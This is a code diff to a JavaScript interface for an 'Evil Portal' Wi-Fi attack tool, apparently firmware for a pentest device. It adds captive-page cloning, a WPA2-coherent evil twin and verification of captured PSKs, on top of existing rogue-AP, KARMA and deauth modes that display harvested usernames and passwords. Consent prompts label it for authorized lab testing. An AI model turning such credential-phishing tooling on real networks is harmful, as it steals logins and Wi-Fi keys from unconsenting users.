@@ -1,31 +1,43 @@
-// Authorized captive-portal testing. Unsupported cloning/coherent modes are not shown.
+// Authorized captive-portal testing with explicit consent and redacted captures by default.
 import { h, icon, toast, errorText, fmtTime, fmtDuration, confirmDialog } from '../../js/ui.js';
 
 export function mount(el, { api, caps: deviceCaps }) {
   let alive = true, requestSeq = 0, busy = false, mode = 'standalone';
-  let state = { active: false, captures: [], templates: [], ssidPresets: [], settings: {}, karma: [], karmaScanning: false, error: null };
+  let state = { active: false, captures: [], templates: [], ssidPresets: [], settings: {}, karma: [], karmaScanning: false, cloning: false, error: null };
   const canTwin = deviceCaps.includes('evil.portal.twin');
   const canKarma = deviceCaps.includes('evil.portal.karma');
   const canCustom = deviceCaps.includes('evil.portal.customTemplates');
+  const canClone = deviceCaps.includes('evil.portal.clone');
+  const canVerify = deviceCaps.includes('evil.portal.verify');
+  const canCoherent = deviceCaps.includes('evil.portal.coherentTwin');
 
   const standaloneTab = h('button', { class: 'tab sel', type: 'button', role: 'tab', 'aria-selected': 'true', 'data-mode': 'standalone', onclick: () => pickMode('standalone') }, 'Standalone AP');
-  const twinTab = canTwin ? h('button', { class: 'tab', type: 'button', role: 'tab', 'aria-selected': 'false', 'data-mode': 'twin', onclick: () => pickMode('twin') }, 'Open Evil Twin') : null;
+  const twinTab = canTwin ? h('button', { class: 'tab', type: 'button', role: 'tab', 'aria-selected': 'false', 'data-mode': 'twin', onclick: () => pickMode('twin') }, 'Evil Twin') : null;
   const karmaTab = canKarma ? h('button', { class: 'tab', type: 'button', role: 'tab', 'aria-selected': 'false', 'data-mode': 'karma', onclick: () => pickMode('karma') }, 'KARMA') : null;
   const modeTabs = h('div', { class: 'tabs', role: 'tablist', 'aria-label': 'Portal mode' }, standaloneTab, twinTab, karmaTab);
   const ssidInput = h('input', { class: 'field', maxlength: '32', placeholder: 'Free Wi-Fi', 'aria-label': 'Portal SSID', autocomplete: 'off' });
   const ssidPreset = h('select', { class: 'field', 'aria-label': 'SSID presets', onchange: e => { if (e.target.value) ssidInput.value = e.target.value; } });
   const twinBssid = h('input', { class: 'field', placeholder: 'aa:bb:cc:dd:ee:ff', 'aria-label': 'Target AP BSSID', autocomplete: 'off' });
   const twinChannel = h('input', { class: 'field', type: 'number', min: '1', max: '13', value: '1', 'aria-label': 'Target AP channel' });
+  const twinPsk = h('input', { class: 'field', type: 'password', minlength: '8', maxlength: '63', autocomplete: 'off', 'aria-label': 'Authorized lab AP PSK' });
+  const coherentCheck = h('input', { type: 'checkbox', 'aria-label': 'Start WPA2-coherent twin', onchange: () => { twinPsk.closest('label').style.display = coherentCheck.checked ? '' : 'none'; } });
   const twinSection = h('div', { class: 'panel' },
     h('h4', {}, 'Evil-twin target'),
-    h('p', { class: 'muted' }, 'Open twin only. WPA2-coherent cloning and PSK verification are not available in this firmware.'),
-    h('div', { class: 'form' }, h('label', {}, 'Target BSSID', twinBssid), h('label', {}, 'Channel', twinChannel)));
+    h('p', { class: 'muted' }, 'Open mode creates an open AP. Coherent mode uses the operator-supplied PSK for your authorized WPA2 lab AP; it does not silently downgrade security.'),
+    h('div', { class: 'form' }, h('label', {}, 'Target BSSID', twinBssid), h('label', {}, 'Channel', twinChannel)),
+    canCoherent ? h('label', { class: 'check' }, coherentCheck, 'WPA2-coherent twin') : null,
+    canCoherent ? h('label', { style: 'display:none' }, 'Known lab AP PSK', twinPsk) : null);
   const templatePicker = h('select', { class: 'field', 'aria-label': 'Portal template' });
   const templateFile = h('input', { class: 'field', type: 'file', accept: '.html,text/html', 'aria-label': 'Custom portal HTML file' });
   const uploadTemplateBtn = h('button', { class: 'btn', type: 'button', onclick: uploadTemplate }, 'Upload template');
   const customSection = canCustom ? h('details', { class: 'panel' }, h('summary', {}, 'Custom SD templates'),
     h('p', { class: 'muted' }, 'Self-contained HTML only: a POST /login form with username and password fields. Maximum 64 KiB. Scripts, external resources and invalid paths are rejected. Files persist in /sd/data/evilportal/portals/.'),
     templateFile, uploadTemplateBtn) : null;
+  const cloneBtn = h('button', { class: 'btn', type: 'button', onclick: clonePage }, 'Clone current SSID');
+  const cloneInfo = h('p', { class: 'muted' }, 'No page cloned this session.');
+  const cloneSection = canClone ? h('div', { class: 'panel' }, h('h4', {}, 'Live page cloning'),
+    h('p', { class: 'muted' }, 'Join the authorized open lab SSID and fetch its captive page. Only an already-safe, self-contained POST /login page is saved as cloned.html; active or external content is rejected.'),
+    cloneBtn, cloneInfo) : null;
   const gatewayInput = h('input', { class: 'field', value: '192.168.4.1', inputmode: 'decimal', 'aria-label': 'Captive gateway IPv4 address' });
   const scanSeconds = h('input', { class: 'field', type: 'number', min: '1', max: '120', value: '10', 'aria-label': 'Probe discovery seconds' });
   const scanBtn = h('button', { class: 'btn', type: 'button', onclick: scanKarma }, icon('search'), 'Scan probes');
@@ -45,6 +57,7 @@ export function mount(el, { api, caps: deviceCaps }) {
   const autoBase = h('input', { class: 'field', type: 'number', min: '0', max: '3600', value: '0', 'aria-label': 'Idle auto-stop seconds' });
   const autoExtended = h('input', { class: 'field', type: 'number', min: '0', max: '3600', value: '0', 'aria-label': 'Active auto-stop seconds' });
   const debugCheck = h('input', { type: 'checkbox', 'aria-label': 'Write non-credential diagnostics to SD' });
+  const verifyCheck = h('input', { type: 'checkbox', 'aria-label': 'Verify captured PSKs against target', disabled: !canVerify });
   const saveSettingsBtn = h('button', { class: 'btn', type: 'button', onclick: saveSettings }, 'Save settings');
 
   el.append(h('div', { class: 'app evilportal' },
@@ -59,6 +72,7 @@ export function mount(el, { api, caps: deviceCaps }) {
         h('label', {}, 'Portal template', templatePicker),
         h('label', {}, 'Gateway IPv4', gatewayInput))),
     customSection,
+    cloneSection,
     twinSection,
     karmaSection,
     h('div', { class: 'row gap' }, startBtn, stopBtn),
@@ -69,6 +83,7 @@ export function mount(el, { api, caps: deviceCaps }) {
         h('label', {}, 'Password display', pwdMode),
         h('label', {}, 'Idle stop (0 = off)', autoBase),
         h('label', {}, 'Active stop (0 = off)', autoExtended)),
+      canVerify ? h('label', { class: 'check' }, verifyCheck, 'Verify captured PSKs against the selected twin BSSID') : null,
       h('label', { class: 'check' }, debugCheck, 'Write diagnostics to SD (no credentials)'), saveSettingsBtn)));
 
   function pickMode(next) {
@@ -82,13 +97,14 @@ export function mount(el, { api, caps: deviceCaps }) {
     if (karmaSection) karmaSection.style.display = mode === 'karma' ? '' : 'none';
   }
   function render() {
-    startBtn.disabled = busy || state.active || state.karmaScanning || (mode === 'karma' && !(state.karma || []).length);
-    stopBtn.disabled = busy || (!state.active && !state.karmaScanning);
-    scanBtn.disabled = busy || state.active || state.karmaScanning;
-    uploadTemplateBtn.disabled = busy || state.active;
+    startBtn.disabled = busy || state.active || state.karmaScanning || state.cloning || (mode === 'karma' && !(state.karma || []).length);
+    stopBtn.disabled = busy || (!state.active && !state.karmaScanning && !state.cloning);
+    scanBtn.disabled = busy || state.active || state.karmaScanning || state.cloning;
+    uploadTemplateBtn.disabled = busy || state.active || state.cloning;
+    cloneBtn.disabled = busy || state.active || state.karmaScanning || state.cloning;
     clearBtn.disabled = busy || !(state.captures || []).length;
     if (state.active) {
-      const modeName = state.mode === 2 ? 'KARMA core' : state.mode === 1 ? 'Open twin' : 'Standalone';
+      const modeName = state.mode === 2 ? 'KARMA core' : state.mode === 1 ? (state.coherent ? 'WPA2-coherent twin' : 'Open twin') : 'Standalone';
       const rows = [
         h('div', { class: 'srow' }, h('span', {}, 'State'), h('span', { class: 'tag alert' }, 'ACTIVE')),
         h('div', { class: 'srow' }, h('span', {}, 'Mode / SSID'), h('span', {}, `${modeName} · ${state.ssid || '—'}`)),
@@ -100,13 +116,15 @@ export function mount(el, { api, caps: deviceCaps }) {
       if (state.twinBssid) rows.push(h('div', { class: 'srow' }, h('span', {}, 'Target / accepted deauth'), h('span', { class: 'mono' }, `${state.twinBssid} / ${state.deauthFrames || 0}`)));
       info.replaceChildren(...rows);
     } else if (state.karmaScanning) info.replaceChildren(h('p', { class: 'muted' }, 'Discovering nearby probe requests…'));
+    else if (state.cloning) info.replaceChildren(h('p', { class: 'muted' }, 'Joining the open lab AP and fetching its captive page…'));
     else info.replaceChildren(h('p', { class: 'muted' }, 'Portal stopped.'));
     if (state.error) info.append(h('p', { class: 'inline-error', role: 'alert' }, state.error));
     if (state.templateError) info.append(h('p', { class: 'inline-error', role: 'alert' }, state.templateError));
+    cloneInfo.textContent = state.cloning ? `Cloning ${state.cloneSsid || 'the selected open lab SSID'}…` : state.cloneName ? `Saved ${state.cloneName} (${state.cloneBytes || 0} bytes). Reloaded in the template picker.` : 'No page cloned this session.';
 
     capturesEl.replaceChildren(...((state.captures || []).length
       ? state.captures.slice(-20).reverse().map(c => h('div', { class: 'note' },
-          h('div', {}, h('b', {}, c.username || '?'), h('p', {}, `${c.password || '?'} · ${c.url || '/login'}`)),
+          h('div', {}, h('b', {}, c.username || '?'), h('p', {}, `${c.password || '?'} · ${c.url || '/login'}${c.verification && c.verification !== 'off' ? ` · PSK ${c.verification}` : ''}`)),
           h('span', { class: 'when' }, fmtTime(c.ts))))
       : [h('p', { class: 'muted' }, 'No credentials captured.')]));
 
@@ -125,6 +143,7 @@ export function mount(el, { api, caps: deviceCaps }) {
     pwdMode.value = String(settings.pwdMode ?? 2);
     if (document.activeElement !== autoBase) autoBase.value = String(settings.autoStopBase || 0);
     if (document.activeElement !== autoExtended) autoExtended.value = String(settings.autoStopExtended || 0);
+    verifyCheck.checked = !!settings.verify;
     debugCheck.checked = !!settings.debug;
   }
 
@@ -139,6 +158,15 @@ export function mount(el, { api, caps: deviceCaps }) {
       render();
     } catch (e) { if (alive && seq === requestSeq && showError) info.replaceChildren(h('p', { class: 'inline-error', role: 'alert' }, errorText(e, 'Evil Portal'))); }
   }
+  async function clonePage() {
+    const ssid = ssidInput.value.trim();
+    if (!ssid) { toast('Enter the authorized open lab SSID first.', 'error'); return; }
+    if (!await confirmDialog('Clone an authorized lab portal?', `Join “${ssid}” and fetch its captive page? Only safe static HTML will be saved to cloned.html on SD. Wi-Fi will reconnect afterwards.`, 'I am authorized — clone')) return;
+    busy = true; render();
+    try { await api.evilportalClone(ssid); toast('Page cloning started'); await load(); }
+    catch (e) { toast(errorText(e, 'Page cloning'), 'error'); }
+    finally { busy = false; if (alive) render(); }
+  }
   async function start() {
     const ssid = ssidInput.value.trim() || 'Free Wi-Fi';
     if (mode === 'twin' && !twinBssid.value.trim()) { toast('Enter the target AP BSSID.', 'error'); return; }
@@ -147,7 +175,7 @@ export function mount(el, { api, caps: deviceCaps }) {
     busy = true; render();
     try {
       const templateId = Number(templatePicker.value) || 0, gateway = gatewayInput.value.trim();
-      if (mode === 'twin') await api.evilportalStartTwin(ssid, twinBssid.value.trim(), Number(twinChannel.value), false, templateId, gateway);
+      if (mode === 'twin') await api.evilportalStartTwin(ssid, twinBssid.value.trim(), Number(twinChannel.value), coherentCheck.checked, templateId, gateway, twinPsk.value);
       else if (mode === 'karma') await api.evilportalStartKarma(templateId, gateway, ssid);
       else await api.evilportalStart(ssid, templateId, gateway);
       toast('Portal started'); await load();
@@ -192,14 +220,14 @@ export function mount(el, { api, caps: deviceCaps }) {
   async function saveSettings() {
     busy = true; render();
     try {
-      await api.evilportalSettings({ pwdMode: Number(pwdMode.value), autoStopBase: Number(autoBase.value), autoStopExtended: Number(autoExtended.value), debug: debugCheck.checked });
+      await api.evilportalSettings({ pwdMode: Number(pwdMode.value), autoStopBase: Number(autoBase.value), autoStopExtended: Number(autoExtended.value), verify: canVerify && verifyCheck.checked, debug: debugCheck.checked });
       toast('Settings saved'); await load();
     } catch (e) { toast(errorText(e, 'Portal settings'), 'error'); }
     finally { busy = false; if (alive) render(); }
   }
 
   pickMode('standalone');
-  const timer = setInterval(() => { if (state.active || state.karmaScanning) load(false); }, 2000);
+  const timer = setInterval(() => { if (state.active || state.karmaScanning || state.cloning) load(false); }, 2000);
   load();
   return { unmount() { alive = false; clearInterval(timer); } };
 }
